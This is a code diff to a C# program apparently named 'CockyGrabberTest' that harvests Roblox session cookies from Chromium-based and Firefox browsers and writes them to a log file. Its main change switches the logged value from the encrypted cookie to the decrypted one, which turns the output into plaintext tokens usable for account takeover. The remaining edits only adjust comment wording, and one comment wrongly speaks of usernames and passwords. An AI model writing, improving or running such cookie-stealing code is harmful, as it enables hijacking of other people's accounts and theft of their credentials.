@@ -6,7 +6,7 @@ using System.Text;
 
 namespace CockyGrabberTest
 {
-    // This Program grabs all Roblox Cookies that could be found and saves them in a log file
+    // This Program grabs all Roblox cookies that could be found and saves them in a log file
     class Program
     {
         private const string LogFilePath = "LOG FILE PATH HERE.txt";
@@ -21,17 +21,17 @@ namespace CockyGrabberTest
             cookies.AppendLine($"NEW LOG STARTED AT {DateTimeOffset.Now}:");
             cookies.AppendLine();
 
-            // Grab logins and store the URLs, Usernames and Passwords in 'logins':
+            // Grab logins and store the URLs, usernames and passwords in 'logins':
             foreach (Blink.Cookie c in g.GetAllBlinkCookiesBy(Blink.Cookie.Header.host_key, ".roblox.com"))
             {
-                cookies.AppendLine($"Host: {c.HostKey} | Name: {c.Name} | Value: {c.EncryptedValue}");
+                cookies.AppendLine($"Host: {c.HostKey} | Name: {c.Name} | Value: {c.DecryptedValue}");
             }
             foreach (Gecko.Cookie c in g.GetAllGeckoCookiesBy(Gecko.Cookie.Header.host, ".roblox.com"))
             {
                 cookies.AppendLine($"Host: {c.Host} | Name: {c.Name} | Value: {c.Value}");
             }
 
-            File.AppendAllText(LogFilePath, cookies.ToString()); // Append the grabbed Logins to the log file
+            File.AppendAllText(LogFilePath, cookies.ToString()); // Append the grabbed logins to the log file
         }
     }
 }
